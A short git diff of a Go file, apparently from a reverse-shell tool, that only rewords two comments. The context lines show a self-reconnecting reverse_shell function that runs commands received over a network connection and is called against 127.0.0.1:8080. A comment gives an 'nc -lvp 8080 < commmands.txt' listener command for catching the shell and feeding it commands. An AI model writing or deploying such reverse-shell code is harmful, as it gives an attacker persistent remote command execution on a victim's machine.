@@ -22,7 +22,7 @@ func reverse_shell(host string, port string) {
 	// Start connection
 	cmd.Run()
 
-	// Then close connection
+	// Close connection
 	connection.Close()
 	reverse_shell(host, port)
 }
@@ -30,5 +30,5 @@ func reverse_shell(host string, port string) {
 func main() {
 
 	reverse_shell("127.0.0.1", "8080")
-	// Run "nc -lvp 8080 < commmands.txt" to catch connection or use client.go
+	// Run "nc -lvp 8080 < commmands.txt" to catch connection (and run pid script) or use client.go
 }
